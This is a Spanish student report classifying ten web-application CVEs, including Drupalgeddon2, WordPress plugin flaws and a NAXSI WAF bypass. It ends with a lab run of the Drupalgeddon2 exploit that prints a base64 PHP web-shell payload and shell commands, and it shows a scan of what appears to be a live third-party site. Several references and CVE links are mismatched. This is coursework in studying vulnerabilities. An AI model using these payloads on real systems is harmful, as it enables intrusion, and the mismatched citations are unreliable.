# Proyecto 1: Hack-Proof Inc.

## **Objetivos**

1. **Investigar Vulnerabilidades**: Identificar y recopilar información sobre vulnerabilidades en un área específica de ciberseguridad seleccionada por el grupo.
2. **Clasificar Vulnerabilidades**: Evaluar y clasificar las vulnerabilidades identificadas según criterios de gravedad, método de explotación y sistemas afectados.
3. **Caracterizar Vulnerabilidades**: Detallar cada vulnerabilidad en términos de descripción, impacto potencial, métodos de explotación y contramedidas.
4. **Informe de Investigación**: Desarrollar un informe exhaustivo que resuma los hallazgos y recomendaciones del análisis de vulnerabilidades.
5. **Presentación Oral**: Comunicar los resultados de la investigación mediante una presentación oral y una demostración en vivo de una de las vulnerabilidades identificadas.

## **Descripción**

### **1. Selección del Área**

Se debe elegir un tema específico dentro del campo de la ciberseguridad para centrar su investigación. Los posibles temas incluyen, pero no se limitan a:

- Sistemas operativos
- Aplicaciones web
- Dispositivos IoT
- Protocolos de red
- Infraestructuras críticas

### **2. Investigación de Vulnerabilidades**

Se llevará a cabo una investigación exhaustiva para identificar y recopilar información sobre las vulnerabilidades en el área seleccionada. Esto implicará:

- Revisión de bases de datos de vulnerabilidades públicas como CVE (Common Vulnerabilities and Exposures).
- Análisis de informes de seguridad de organizaciones reconocidas.
- Consulta de publicaciones académicas y artículos de investigación.

### **3. Clasificación de Vulnerabilidades**

Tras recopilar información, se debe analizar y clasificar las 10 vulnerabilidades más relevantes. La clasificación se basará en:

- **Gravedad**: Evaluación del impacto potencial.
- **Método de Explotación**: Cómo pueden ser aprovechadas por un atacante.
- **Sistemas o Componentes Afectados**: Identificación de los elementos vulnerables.

### **4. Caracterización de Vulnerabilidades**

Cada vulnerabilidad identificada se describirá en detalle en el informe de investigación. La caracterización incluirá:

- **Descripción**: Explicación detallada de la vulnerabilidad y su funcionamiento.
- **Impacto**: Evaluación del impacto potencial en términos de confidencialidad, integridad y disponibilidad de los datos o sistemas.
- **Exploración y Explotación**: Descripción de cómo podría ser explotada la vulnerabilidad, incluyendo métodos, herramientas y tipos de atacantes.
- **Contramedidas**: Propuestas de soluciones o estrategias para mitigar o prevenir la explotación de la vulnerabilidad.

### **5. Informe de Investigación**

El informe de investigación debe estar estructurado de manera clara y organizada, e incluirá:

- Introducción: Contexto y objetivos del proyecto.
- Clasificación y Caracterización: Detalle de las vulnerabilidades investigadas.
- Conclusiones: Resumen de los hallazgos y su relevancia.
- Recomendaciones: Estrategias para mitigar o prevenir las vulnerabilidades identificadas.

### **6. Presentación Oral**

Finalmente, el grupo realizará una presentación oral de 15-20 minutos para destacar los aspectos más relevantes de su investigación. La presentación debe incluir:

- Resumen de los hallazgos clave.
- Demostración en vivo de una vulnerabilidad, asegurándose de que sea segura y ética, con aprobación previa del profesor.

## Introducción

En este proyecto hemos seleccionado como área a investigar vulnerabilidades en el ámbito de aplicaciones web.

En el ámbito de la ciberseguridad, las vulnerabilidades en las aplicaciones web son fallos o debilidades en el diseño, implementación o configuración de una aplicación que pueden ser explotadas por atacantes para comprometer la seguridad del sistema. Estas vulnerabilidades pueden permitir el acceso no autorizado a datos sensibles, la ejecución de código malicioso, la interrupción de servicios o la suplantación de identidad. Algunas de las más comunes incluyen inyecciones SQL, secuencias de comandos en sitios cruzados (XSS), fallos de autenticación y gestión de sesiones, y exposiciones de datos sensibles. La identificación y mitigación de estas vulnerabilidades es esencial para proteger la integridad, confidencialidad y disponibilidad de los datos y servicios ofrecidos por las aplicaciones web.

Para realizar la siguiente selección de vulnerabilidades web, hemos revisado las bases de datos de CVE, NVD, ExploitDB y OWASP, analizado los informes como por ejemplo de Symantec y McAfee.

# Clasificación y caracterización de Vulnerabilidades

# CVE-2018-7600 - Drupalgeddon 2

Fecha de publicación: 29/03/2018

### CVSS v3.1 Vector : [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1) Score: 9.8

### Severidad: CRÍTICA

### CWE-94: Improper Control of Generation of Code ('Code Injection')

### Descripción:

Permite que los atacantes remotos ejecuten código arbitrario debido a un problema que afecta a múltiples subsistemas con configuraciones de módulos por defecto o comunes.

El problema subyacente es que el núcleo de Drupal (al igual que otros frameworks) acepta parámetros de solicitud como objetos de matriz. Un usuario puede pasar un objeto de matriz a la aplicación con el nombre clave que contiene la carga útil que Drupal procesaría ddirectamente debido a la falta de sanitización de estos parámetros.

Versiones afectadas: Versiones anteriores a la 7.58, 8.x anteriores a la 8.3.9, 8.4.x anteriores a la 8.4.6 y 8.5.x anteriores a la 8.5.1

### Productos y versiones vulnerables

- cpe:2.3: a :drupal:drupal: * : * : * : * : *: * : * : *
- cpe:2.3: a :drupal:drupal: * : * : * : * : * : * : * : *
- cpe:2.3: a :drupal:drupal: * : * : * : * : * : * : * : *
- cpe:2.3: a :drupal:drupal: * : * : * : * : * : * : * : *
- cpe:2.3: o :debian:debian_linux:8.0: * : * : * : * : * : *: *

### Remediación

Un vistazo rápido a la rama 7.58 de Drupal que soluciona estos problemas muestra que se agregó 1 archivo nuevo y se actualizó un archivo existente anteriormente.

El directorio “/includes” contiene varios archivos .inc que se llaman cuando se accede a Drupal para configurar el entorno del servidor, las variables del lado del servidor y el manejo de los datos proporcionados por el usuario en el servidor.

La nueva versión lanzada, 7.58, tiene un nuevo archivo llamado "request-sanitizer.inc" que contiene funciones para limpiar la entrada del usuario proporcionada a través de GET, POST o una cookie.

### Exploit

```

#!/usr/bin/env ruby

#

# [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ <https://github.com/dreadlocked/Drupalgeddon2/>

#

# Authors:

# - Hans Topo ~ <https://github.com/dreadlocked> // <https://twitter.com/_dreadlocked>

# - g0tmi1k ~ <https://blog.g0tmi1k.com/> // <https://twitter.com/g0tmi1k>

#

```

**[Exploit completo](https://www.exploit-db.com/exploits/44449)**

### Referencias

[1] **[INCIBE](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2018-7600)**

[2] **[Medium](https://blog.appsecco.com/remote-code-execution-with-drupal-core-sa-core-2018-002-95e6ecc0c714)**

# CVE-2023-25056 - Feed Them Social

Fecha de publicación: 23/05/2023

### CVSS v3.1 Vector : [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H&version=3.1) Score: 8.80

### Severidad: ALTA

### CWE-352: Falsificación de petición en sitios cruzados (Cross-Site Request Forgery)

### Descripción:

Rio Darmawan descubrió e informó esta vulnerabilidad de falsificación de solicitudes entre sitios (CSRF) en el plugin "Feed Them Social" de WordPress. Esto podría permitir que un atacante obligue a los usuarios con mayores privilegios a ejecutar acciones no deseadas con su autenticación actual. Esta vulnerabilidad se ha solucionado en la versión 4.0.0.

### Productos y versiones vulnerables

- cpe:2.3: a :slickremix:feed_them_social: * : * : * : * : * :wordpress : * : *

### Remdiación

Actualizar el plugin hasta al menos la versión 4.0.0.

### Detección

Este es el resultado de un escaneo realizado con wpscan, que nos informa de que la vulnerabilidad se encuentra activa.

```

[+] feed-them-social

| Location: <https://nebenet.it/wp-content/plugins/feed-them-social/>

| Last Updated: 2023-06-01T04:09:00.000Z

| [!] The version is out of date, the latest version is 4.1.5

|

| Found By: Urls In Homepage (Passive Detection)

| Confirmed By: Urls In 404 Page (Passive Detection)

|

| [!] 1 vulnerability identified:

|

| [!] Title: Feed Them Social <= 3.0.2 - Settings Update via CSRF

| Fixed in: 4.0.0

| References:

| - <https://wpscan.com/vulnerability/7c9c1413-8a60-4508-b765-f4903a3de0e3>

| - <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25056>

|

| Version: 3.0.2 (100% confidence)

| Found By: Query Parameter (Passive Detection)

| - <https://nebenet.it/wp-content/plugins/feed-them-social/feeds/css/styles.css?ver=3.0.2>

| - <https://nebenet.it/wp-content/plugins/feed-them-social/feeds/js/powered-by.js?ver=3.0.2>

| - <https://nebenet.it/wp-content/plugins/feed-them-social/feeds/js/fts-global.js?ver=3.0.2>

| Confirmed By:

| Readme - Stable Tag (Aggressive Detection)

| - <https://nebenet.it/wp-content/plugins/feed-them-social/readme.txt>

| Readme - ChangeLog Section (Aggressive Detection)

| - <https://nebenet.it/wp-content/plugins/feed-them-social/readme.txt>

```

### Referencias

[1] **[https://patchstack.com/database/vulnerability/feed-them-social/wordpress-feed-them-social-for-twitter-feed-youtube-and-more-plugin-3-0-2-cross-site-request-forgery-csrf-vulnerability?_s_id=cve**](https://patchstack.com/database/vulnerability/feed-them-social/wordpress-feed-them-social-for-twitter-feed-youtube-and-more-plugin-3-0-2-cross-site-request-forgery-csrf-vulnerability?_s_id=cve**)

[2] **[https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-25056](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-25056)**

# CVE-2020-28035 - WordPress XML-RPC

Fecha de publicación: 03/11/2020

### CVSS v3.1 Vector: [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1) Score: 9.80

### Severidad: CRÍTICA

### CWE-264: Weaknesses in this category are related to the management of permissions, privileges, and other security features that are used to perform access control.

### Descripción:

WordPress antes de la versión 5.5.2 permite a los atacantes obtener privilegios a través de XML-RPC.

XML-RPC (Remote Procedure Call) es un protocolo que permite la llamada a procedimientos de forma remota, usa XML para codificar los datos y HTTP para su transporte.

En este protocolo quedan definidos algunos comandos útiles y una breve descripción.

### Productos y versiones vulnerables

- cpe:2.3: a :wordpress:wordpress: * : * : * : * : * : * : * : *
- cpe:2.3: o :fedoraproject:fedora:31: * : * : * : * : * : * : *
- cpe:2.3: o :fedoraproject:fedora:32: * : * : * : * : * : * : *
- cpe:2.3: o :fedoraproject:fedora:33: * : * : * : * : * : * : *
- cpe:2.3: o :debian:debian_linux:10.0: * : * : * : * : * : * : *

### Remediación

Tanto wordpress como en los foros de Fedora se recomienda simplemente actualizar los plugins a su última versión.

### Exploit / PoC

```php

WC_Log_Handler_File Object

(

[handles:protected] => Requests_Utility_FilteredIterator Object

(

[callback:protected] => system

[storage:ArrayIterator:private] => Array

(

[0] => id

)

)

)

uid=1000(nth347) gid=1000(nth347) groups=1000(nth347),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare)

```

**[PoC](https://github.com/nth347/CVE-2020-28032_PoC)**

### Referencias

[1]**[Patchstack.com](https://patchstack.com/database/vulnerability/feed-them-social/wordpress-feed-them-social-for-twitter-feed-youtube-and-more-plugin-3-0-2-cross-site-request-forgery-csrf-vulnerability?_s_id=cve)**

[2] **[Wordpress.org](https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/)**

# CVE-2023-45132 - Vulnerabilidad en NAXSI

Fecha de publicación: 10/11/2023

### CVSS v3.1 Vector: [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H&version=3.1) Score: 9.10

### Severidad: CRÍTICA

### CWE-693: Protection Mechanism Failure

### Descripción:

NAXSI es un firewall de aplicaciones web (WAF) de código abierto para NGINX. Un problema presente a partir de la versión 1.3 y anteriores a la versión 1.6 permite que alguien omita el WAF cuando una IP maliciosa `X-Forwarded-For` coincide con las reglas `IgnoreIP` y `IgnoreCIDR`. Este código antiguo tenía como objetivo permitir que las versiones anteriores de NGINX también admitieran `IgnoreIP` y `IgnoreCIDR` cuando había varios servidores proxy inversos presentes. El problema se solucionó en la versión 1.6. Otra solución posible sería no configurar ninguna ip en los campos `IgnoreIP` y `IgnoreCIDR` en versiones anteriores.

### Productos y versiones vulnerables

- Todas las que no han sido actualizadas desde el 9/10/2023, siendoi estas las versiones >= 1.3 y siendo aprcheado en la versión 1.6.

### Remediación

Actualizar la herramienta y no establecer ninguna ip en "IgnoreIP "IgnoreCIDR" en versiones anteriores. En el software se eliminaron las siguientes línas de código que provocaban el fallo.

```c

#if (NGX_HTTP_X_FORWARDED_FOR)

#if (nginx_version <  1023000)

ngx_table_elt_t** h;

if (r->headers_in.x_forwarded_for.nelts >=  1) {

h = r->headers_in.x_forwarded_for.elts;

NX_DEBUG(_debug_whitelist_ignore,

NGX_LOG_DEBUG_HTTP,

r->connection->log,

0,

"XX- lookup ignore X-Forwarded-For: %V",

h[0]->value);

ngx_str_t* ip =  &h[0]->value;

ctx->ignore = naxsi_can_ignore_ip(ip, cf) || naxsi_can_ignore_cidr(ip, cf);

} else

#else

ngx_table_elt_t* xff;

if (r->headers_in.x_forwarded_for != NULL) {

xff = r->headers_in.x_forwarded_for;

NX_DEBUG(_debug_whitelist_ignore,

NGX_LOG_DEBUG_HTTP,

r->connection->log,

0,

"XX- lookup ignore X-Forwarded-For: %V",

xff->value);

ngx_str_t* ip =  &xff->value;

ctx->ignore = naxsi_can_ignore_ip(ip, cf) || naxsi_can_ignore_cidr(ip, cf);

} else

#endif

#endif

{

```

**[Commit con solución](https://github.com/wargio/naxsi/commit/1b712526ed3314dd6be7e8b0259eabda63c19537)**

### Exploit / PoC

Para este tipo de vulnerabilidad no existe exploit, pero son los propios desarrolladores los que discuten el fallo.

```

**[lubomudr](<https://github.com/lubomudr>)** commented [last week](<https://github.com/wargio/naxsi/pull/103#issue-1931275088>) •

Hi

The special handling of X-Forwarded-For in runtime.c is a security hole and VERY DANGEROUS.

If the ngx_http_realip_module module configuration is enabled, the NGINX $remote_addr variable is replaced with X-Forwarded-For if (and only if) the IP packet came from any trusted host in set_real_ip_from.

If the IP packet arrived from any other hosts or the ngx_http_realip_module module is not enabled, processing of the X-Forwarded-For header is ignored.

Handling of the X-Forwarded-For header must be completely transparent to NAXSI

```

**[Comentario de los desarrolladores](https://github.com/wargio/naxsi/security/advisories/GHSA-7qjc-q4j9-pc8x)**

### Referencias

[1] **[Github solución](https://github.com/wargio/naxsi/commit/1b712526ed3314dd6be7e8b0259eabda63c19537)**

[2] **[Github publicación](https://github.com/wargio/naxsi/security/advisories/GHSA-7qjc-q4j9-pc8x)**

[3] **[Github comentario](https://github.com/wargio/naxsi/pull/103)**

# CVE-2023-31802 - Chamilo LMS

Fecha de publicación: 05/12/2023

### CVSS v3.1 Vector: [AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N&version=3.1) Score: 5.40

### Severidad: MEDIA

### CWE-79

### Descripción

La vulnerabilidad Cross Site Scripting encontrada en Chamilo Lms v.1.11.18 permite a un atacante local ejecutar código arbitrario a través de los parámetros de Skype y linedin_url (LINKEDIN).

Básicamente se trata de un tipo de ataque que aprovecha fallas de seguridad en sitios web y que permite a los atacantes implantar scripts maliciosos en un sitio web legítimo (también víctima del atacante) para ejecutar un script en el navegador de un usuario desprevenido que visita dicho sitio y afectarlo, ya sea robando credenciales, redirigiendo al usuario a otro sitio malicioso, o para realizar defacement en un sitio web.

### Productos y versiones vulnerables

cpe:2.3: a :chamilo:chamilo_lms:1.11.18: * : * : * : * : * : * : *

### Remediación

Utilizar una biblioteca que no permita que se produzca esta debilidad o que proporcione construcciones que hagan que esta debilidad sea más fácil de evitar.

Algunos ejemplos de bibliotecas y marcos que facilitan la generación de resultados codificados correctamente son la biblioteca Anti-XSS de Microsoft, el módulo de codificación OWASP ESAPI y Apache Wicket.

### Exploit

No hay exploit.

### Referencias

[1] **[Prohacktive.io](https://kb.prohacktive.io/es/index.php?action=detail&id=CVE-2023-31802)**

[2] **[Aquasec.com](https://avd.aquasec.com/nvd/2023/cve-2023-31802/)**

# CVE-2020-23643 - JIZHICMS

Fecha de publicación: 11/01/2021

### CVSS v3.1 Vector: [AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N&version=3.1) Score: 6.10

### Severidad: MEDIA

### CWE-79

### Descripción

Una vulnerabilidad de tipo XSS se presenta en JIZHICMS versión 1.7.1 por medio de index.php/Wechat/checkWeixin?signature=1&echostr={XSS] en el archivo Home/c/WechatController.php.

Básicamente se trata de un tipo de ataque que aprovecha fallas de seguridad en sitios web y que permite a los atacantes implantar scripts maliciosos en un sitio web legítimo (también víctima del atacante) para ejecutar un script en el navegador de un usuario desprevenido que visita dicho sitio y afectarlo, ya sea robando credenciales, redirigiendo al usuario a otro sitio malicioso, o para realizar defacement en un sitio web.

### Productos y versiones vulnerables

cpe:2.3: a :jizhicms:jizhicms:1.7.1: * : * : * : * : * : * : *

### Remediación

Utilizar una biblioteca que no permita que se produzca esta debilidad o que proporcione construcciones que hagan que esta debilidad sea más fácil de evitar.

Algunos ejemplos de bibliotecas y marcos que facilitan la generación de resultados codificados correctamente son la biblioteca Anti-XSS de Microsoft, el módulo de codificación OWASP ESAPI y Apache Wicket.

### Exploit

No hay exploit.

### Referencias

[1] **[Aquasec.com](https://avd.aquasec.com/nvd/2020/cve-2020-23643/)**

[2] **[NIST](https://nvd.nist.gov/vuln/detail/CVE-2020-23643)**

# CVE-2022-23795 - Joomla!

Fecha de publicación: 30/03/2022

### CVSS v3.1 Vector: [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1) Score: 9.8

### Severidad: CRÍTICA

### CWE-287 Autenticación inadecuada (Cuando un actor afirma tener una identidad determinada, el producto no prueba o prueba insuficientemente que la afirmación sea correcta.)

### Descripción

Se ha detectado un problema en Joomla! versiones 2.5.0 hasta 3.10.6 y 4.0.0 hasta
4.1.0.

La vulnerabilidad permite a un atacante remoto eludir el proceso de autenticación.

La vulnerabilidad existe debido a que una fila de usuario no está vinculada a un
mecanismo de autenticación específico. Un atacante remoto puede eludir el proceso
de autenticación y apoderarse de cuentas de otros usuarios de aplicaciones web en
circunstancias específicas.

### Productos y versiones vulnerables

- cpe:2.3: a :joomla:joomla\!: * : * : * : * : * : * : * : *
- cpe:2.3: a :joomla:joomla\!: * : * : * : * : * : * : * : *

### Remediación

Se recomienda no actualizar a la versiones 3.10.7 ni 4.1.1, ya que, en ciertas ocasiones, pueden provocar que aparezca el error: “1054 Unknown column 'authProvider' in 'field list'”, al loguearse en el panel de Joomla!, impidiendo el acceso a este.

Realizar, por tanto, una de las siguientes acciones:

- Instalar las versiones 4.1.2 o 3.10.8.
- Actualizar la versión en uso a la 4.1.2 o 3.10.8.

### Exploit

**[Exploit Codigo](https://github.com/Acceis/exploit-CVE-2023-23752/blob/master/assets/help.png)**

**[Exploit Ejemplo](https://github.com/Acceis/exploit-CVE-2023-23752/blob/master/assets/help.png)**

### Referencias

[1] **[INCIBE CVE-2022-23795](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2022-23795)**

[2] **[GITHUB EXPLOIT](https://github.com/Acceis/exploit-CVE-2023-23752)**

# CVE-2023-42362 - NCR Teller

Fecha de publicación: 14/09/2023

### CVSS v3.1 Vector: [AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N&version=3.1) Score: 5.4

### Severidad: MEDIA

### CWE-79 Neutralización incorrecta de la entrada durante la generación de la página web(Cross-site Scripting)

### Descripción

La carga de archivos sin restricciones que conduce a la vulnerabilidad de scripts
entre sitios almacenados (XSS) es un problema de seguridad identificado dentro de
la aplicación web. Esta vulnerabilidad surge debido a la falta de una validación de
entrada adecuada en la funcionalidad de carga de archivos.

Los atacantes pueden cargar un archivo malicioso que contiene código JavaScript
que les permite secuestrar la sesión de administración, que ya está almacenada en
el almacenamiento local. Esta infracción podría resultar en la apropiación de la
cuenta de administrador, otorgándoles acceso completo a las funcionalidades de
administrador.

### Productos y versiones vulnerables

- cpe:2.3: a :teller:teller:4.4.0: * : * : * : * : * : * : *

### Remediación

Instalar la última versión de la aplicación web NCR Teller.

### Referencias

[1] **[INCIBE CVE-2022-23795](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-42362)**

[2] **[GITHUB](https://github.com/Mr-n0b3dy/CVE-2023-42362)**

[3] **[NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-42362#vulnConfigurationsArea)**

# CVE-2011-3614 - Vanilla Forums

Fecha de publicacion: 22/01/2020

### CVSS v3.1 Vector: [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1) Score: 9.80

### Severidad: Critica

### CWE-284: Control de Acceso Inadecuado 

### Descripción

Se presenta una vulnerabilidad de Control de Acceso en los plugins de Facebook, Twitter y
Embedded en Vanilla Forums versiones anteriores a 2.0.17.9.

El problema aparece en un fallo del sistema el cual divulgaba información sobre las cookies.
Además de un error en el control de acceso el cual evitaba las restricciones de seguridad.

### Productos y versiones vulnerables

- ●	cpe:2.3: a :vanillaforums:vanilla: * : * : * : * : * : * : * : *

### Remediación

Actualizar a la version 2.0.17.9

### Exploit

No existe

### Referencias

[1] **[Secunia Security Advisory 46387](https://packetstormsecurity.com/files/105853/Secunia-Security-Advisory-46387.html)**

[2] **[Openwall - oss-security](https://www.openwall.com/lists/oss-security/2011/10/10/5)**

# CVE-2023-3124

Fecha de publicación: 07/06/2023

### CVSS v3.1 Vector: [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1) Score: 9.80

### Severidad: Critica

### CWE-862: Missing Authorization

### Descripción:

El plugin Elementor Pro para WordPress es vulnerable a la modificación no autorizada de datos debido
a una falta de comprobación en la función "update_page_option" en versiones hasta la 3.11.6 inclusive.

Esto hace posible que atacantes autenticados con capacidades a nivel de suscriptor actualicen opciones del
sitio arbitrarias, lo que puede llevar a una escalada de privilegios.

### Productos y versiones vulnerables

- cpe:2.3: a :elementor:elementor_pro: * : * : * : * : * :wordpress: * : *

### Remediación

Actualizar inmediatamente si tiene instalada la versión 3.11.6 o inferior.

### Exploit

No existe

### Referencias

[1] **[High Severity Vulnerability Fixed in WordPress Elementor Pro Plugin](https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-wordpress-elementor-pro-plugin/)**

[2] **[INCIBE-CERT - CVE-2023-3124](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-3124)**

## Explotación de una de las vulnerabilidades

La vulnerabilidad a explotar será la primera presentada en el proyecto CVE-2018-7600, conocida como Drupalgeddon 2, usaremos el script mencionado anteriormente descargado de [exploitdb.com](http://exploitdb.com/). Usaremos como víctima una máquina virtual con Debian y Dupral 7.0 instalado.
Empezamos obteniendo información del objetivo escaneando la red en busca de su IP y los servicios que tiene expuestos al exterior.

```
└─$ nmap -sC 192.168.56.0/24
Starting Nmap 7.94 ( <https://nmap.org> ) at 2023-10-15 20:23 CEST
Nmap scan report for 192.168.56.1
Host is up (0.00012s latency).
All 1000 scanned ports on 192.168.56.1 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 192.168.56.5
Host is up (0.00015s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey:
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http
|_http-title: Welcome to Drupal Site | Drupal Site
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (<http://drupal.org>)
111/tcp open  rpcbind
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39179/udp   status
|   100024  1          45347/udp6  status
|   100024  1          53913/tcp6  status
|_  100024  1          60026/tcp   status

Nmap done: 256 IP addresses (2 hosts up) scanned in 19.33 seconds

```

Si visitamos la ip con nuestro navegador vemos que tiene el drupal corriendo y es wappalyzer el que nos otorga la versión, en este caso 7.
Utilizamos el exploit creado en ruby que nos generará una shell reversa, antes, tenemos que isntalar una dependencia del script con el comando:
`sudo gem install highline`

Ahora usamos el script y le damos como argumento la url del drupal.

```
└─$ ruby 44449.rb <http://192.168.56.5/>
ruby: warning: shebang line ending with \\r may cause problems
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : <http://192.168.56.5/>
--------------------------------------------------------------------------------
[!] MISSING: <http://192.168.56.5/CHANGELOG.txt>    (HTTP Response: 404)
[!] MISSING: <http://192.168.56.5/core/CHANGELOG.txt>    (HTTP Response: 404)
[+] Found  : <http://192.168.56.5/includes/bootstrap.inc>    (HTTP Response: 403)
[!] MISSING: <http://192.168.56.5/core/includes/bootstrap.inc>    (HTTP Response: 404)
[+] Found  : <http://192.168.56.5/includes/database.inc>    (HTTP Response: 403)
[+] URL    : v7.x/6.x?
[+] Found  : <http://192.168.56.5/>    (HTTP Response: 200)
[+] Metatag: v7.x/6.x [Generator]
[!] MISSING: <http://192.168.56.5/>    (HTTP Response: 200)
[+] Drupal?: v7.x/6.x
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo YUAKQMHQ
[+] Result : YUAKQMHQ
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (<http://192.168.56.5/shell.php>)
[!] Response: HTTP 200 // Size: 7.   ***Something could already be there?***
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl '<http://192.168.56.5/shell.php>' -d 'c=hostname'
DC-1>> whoami
www-data

```

Como podemos ver, al usar el comando whoami, estamos con el usuario www-data, dentro de la máquina víctima.

# Conclusiones

En el ámbito de la ciberseguridad, la identificación, caracterización y mitigación de vulnerabilidades en aplicaciones web son esenciales para proteger la integridad, confidencialidad y disponibilidad de los datos y servicios ofrecidos por estas aplicaciones. A lo largo de este proyecto, hemos explorado varias vulnerabilidades críticas y altas que afectan a sistemas y plataformas ampliamente utilizadas como Drupal, WordPress, Joomla, y otros frameworks y plugins.

## **Resumen de Vulnerabilidades Analizadas**

1. **CVE-2018-7600 (Drupalgeddon2)**: Esta vulnerabilidad crítica permite la ejecución remota de código debido a una falla en la sanitización de parámetros de solicitud. La remediación implicó la implementación de un nuevo archivo "request-sanitizer.inc" para limpiar las entradas de usuario.
2. **CVE-2023-25056 (Feed Them Social de WordPress)**: Una vulnerabilidad de falsificación de petición en sitios cruzados (CSRF) que podría permitir a un atacante ejecutar acciones no deseadas con autenticación de usuarios privilegiados. La solución fue actualizar el plugin a la versión 4.0.0.
3. **CVE-2020-28035 (WordPress XML-RPC)**: Una vulnerabilidad crítica que permitía a los atacantes obtener privilegios a través del protocolo XML-RPC. La remediación recomendada fue actualizar los plugins a sus versiones más recientes.
4. **CVE-2023-45132 (NAXSI WAF)**: Esta vulnerabilidad crítica permitía omitir el firewall de aplicaciones web mediante la manipulación de la cabecera **`X-Forwarded-For`**. La solución fue actualizar a la versión 1.6 y eliminar configuraciones específicas de **`IgnoreIP`** y **`IgnoreCIDR`**.
5. **CVE-2023-31802 (Chamilo LMS)**: Una vulnerabilidad de Cross Site Scripting (XSS) que permitía a un atacante ejecutar código arbitrario a través de parámetros específicos. La recomendación fue utilizar bibliotecas de codificación que mitiguen esta debilidad.
6. **CVE-2020-23643 (JIZHICMS)**: Otra vulnerabilidad XSS similar que afectaba a JIZHICMS, explotable a través de parámetros no sanitizados. La solución fue la misma: utilizar bibliotecas de codificación adecuadas.
